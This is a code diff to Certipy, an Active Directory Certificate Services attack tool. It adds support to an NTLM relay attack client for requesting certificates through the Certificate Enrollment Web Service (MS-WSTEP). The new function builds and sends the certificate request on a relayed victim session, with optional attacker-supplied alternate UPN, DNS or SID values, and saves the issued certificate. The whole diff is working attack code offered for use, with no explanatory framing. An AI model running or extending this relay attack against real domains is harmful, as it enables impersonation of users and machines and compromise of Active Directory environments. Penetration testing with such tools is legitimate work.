@@ -49,8 +49,14 @@ from certipy.lib.certificate import (
     csr_to_pem,
     der_to_cert,
 )
+from certipy.lib.ces import (
+    SOAP_CONTENT_TYPE,
+    CESError,
+    build_wstep_request,
+    parse_wstep_response,
+)
 from certipy.lib.constants import OID_TO_STR_NAME_MAP, USER_AGENT
-from certipy.lib.errors import handle_error
+from certipy.lib.errors import handle_error, translate_error_code
 from certipy.lib.logger import logging
 from certipy.lib.ntlm import NtlmNotSupportedError
 from certipy.lib.req import (
@@ -441,6 +447,11 @@ class ADCSHTTPAttackClient(ProtocolAttack):
             )
             return
 
+        # Relay into the Certificate Enrollment Web Service (MS-WSTEP)
+        if self.adcs_relay.ces:
+            self._request_certificate_ces()
+            return
+
         # Handle template enumeration mode
         if self.adcs_relay.enum_templates:
             self._enumerate_templates()
@@ -591,6 +602,119 @@ class ADCSHTTPAttackClient(ProtocolAttack):
                 self.adcs_relay.out,
                 self.adcs_relay.pfx_password,
             )
+
+        return self.finish_run()
+
+    def _request_certificate_ces(self) -> None:
+        """
+        Request a new certificate for the relayed user via CES (MS-WSTEP).
+
+        Builds an MS-WSTEP RequestSecurityToken SOAP envelope and POSTs it on
+        the already NTLM-authenticated relayed session, then saves any
+        issued certificate.
+        """
+        # Validate username before proceeding — an empty username from the
+        # NTLM response will cause CSR generation to fail if no explicit
+        # subject DN was provided.
+        if not self.username and not self.adcs_relay.subject:
+            logging.error(
+                "Relayed NTLM authentication returned an empty username "
+                f"(authenticated as {self.client.user!r}). "
+                "Cannot generate CSR without a valid subject. "
+                "Use '-subject CN=<target>' to specify an explicit subject DN."
+            )
+            return
+
+        if self.adcs_relay.archive_key:
+            logging.warning(
+                "Key archival (-archive-key) is not supported over CES; ignoring"
+            )
+
+        ces_to_url = self.adcs_relay.ces_to_url
+        assert ces_to_url is not None, "ces_to_url must be set when -ces is used"
+
+        # Choose appropriate template based on username
+        template = self.config.template
+        if template is None:
+            template = "Machine" if self.username.endswith("$") else "User"
+
+        # Generate certificate signing request
+        csr, key = create_csr(
+            self.username,
+            alt_dns=self.adcs_relay.alt_dns,
+            alt_upn=self.adcs_relay.alt_upn,
+            alt_sid=self.adcs_relay.alt_sid,
+            subject=self.adcs_relay.subject,
+            key_size=self.adcs_relay.key_size,
+            application_policies=self.adcs_relay.application_policies,
+            smime=self.adcs_relay.smime,
+        )
+        csr_der = csr_to_der(csr)
+
+        # Build certificate attributes
+        attributes = create_csr_attributes(
+            template,
+            alt_dns=self.adcs_relay.alt_dns,
+            alt_upn=self.adcs_relay.alt_upn,
+            alt_sid=self.adcs_relay.alt_sid,
+        )
+
+        body = build_wstep_request(ces_to_url, csr_der, attributes)
+
+        logging.info(
+            f"Requesting certificate for {self.client.user!r} based on the template {template!r}"
+        )
+
+        # Certificate issuance can take significantly longer than the NTLM
+        # auth handshake, so use an extended timeout for the POST request.
+        # Use at least 60 seconds, or the session's configured read timeout
+        # if larger.
+        session_read_timeout = getattr(self.client.timeout, "read", 10) or 10
+        cert_request_timeout = max(session_read_timeout, 60)
+
+        # Use the raw (percent-encoded) path rather than the decoded `.path`
+        # — a CA name containing a space would otherwise be re-encoded
+        # incorrectly when sent on the wire.
+        path = httpx.URL(ces_to_url).raw_path.decode()
+
+        res = self.client.post(
+            path,
+            content=body,
+            headers={"Content-Type": SOAP_CONTENT_TYPE},
+            timeout=cert_request_timeout,
+        )
+
+        if res.status_code == 401:
+            logging.error("Relayed CES request was unauthorized")
+            return self.finish_run()
+
+        try:
+            response = parse_wstep_response(res.content)
+        except CESError as e:
+            if e.error_code is not None:
+                logging.error(f"CES error: {translate_error_code(e.error_code)}")
+            request_id_msg = (
+                f" (request ID {e.request_id})" if e.request_id is not None else ""
+            )
+            logging.error(f"CES returned an error: {e}{request_id_msg}")
+            return self.finish_run()
+
+        if response.certificate is None:
+            logging.warning(
+                "CES did not return a certificate "
+                f"(disposition {response.disposition_message!r})"
+            )
+            return self.finish_run()
+
+        handle_request_response(
+            response.certificate,
+            key,
+            self.client.user,
+            self.adcs_relay.subject,
+            self.adcs_relay.alt_sid,
+            self.adcs_relay.out,
+            self.adcs_relay.pfx_password,
+        )
 
         return self.finish_run()
 
